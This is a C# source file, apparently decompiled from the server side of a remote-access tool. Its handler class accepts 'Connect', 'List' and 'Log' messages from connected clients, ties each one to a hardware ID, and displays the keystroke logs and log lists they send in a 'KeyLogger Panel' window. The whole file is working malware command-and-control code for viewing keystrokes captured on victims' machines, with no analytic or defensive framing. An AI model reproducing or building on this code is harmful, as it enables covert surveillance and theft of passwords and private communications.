using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerKeyLoggerPanel
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "List"))
			{
				if (!(a == "Log"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				FormKeyLoggerPanel form = (FormKeyLoggerPanel)client.Tag;
				form.Invoke((MethodInvoker)delegate
				{
					form.richTextBox1.Text = (string)objects[2];
				});
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormKeyLoggerPanel form2 = (FormKeyLoggerPanel)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.dataGridView3.Rows.Clear();
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = { (DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[num++]
						} }
					};
					form2.dataGridView3.Rows.Add(dataGridViewRow);
				}
			});
			return;
		}
		FormKeyLoggerPanel form3 = (FormKeyLoggerPanel)Application.OpenForms["KeyLoggerPanel:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.Text = "KeyLogger Panel [" + (string)objects[2] + "]";
			form3.client = client;
			form3.richTextBox1.Enabled = true;
			form3.dataGridView3.Enabled = true;
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
